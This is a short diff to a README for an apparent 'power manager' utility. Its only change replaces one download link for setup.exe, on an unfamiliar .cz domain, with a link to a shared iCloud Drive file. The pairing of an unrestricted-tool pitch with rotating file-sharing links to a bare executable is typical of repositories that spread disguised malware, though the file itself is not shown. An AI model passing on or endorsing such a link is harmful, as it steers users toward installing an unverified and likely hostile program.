@@ -9,7 +9,7 @@ Choose your power schema without any limitations
 
 ## Getting started
 
-- Obtain stable version and install <a href="http://itradce.cz/downloads/powermanager/setup.exe">setup.exe</a>
+- Obtain stable version and install <a href="https://www.icloud.com/iclouddrive/0XtXf0rQ5wZC8rKOo8WTjzwdA#setup.exe">setup.exe</a>
 
 ## Motivation
 
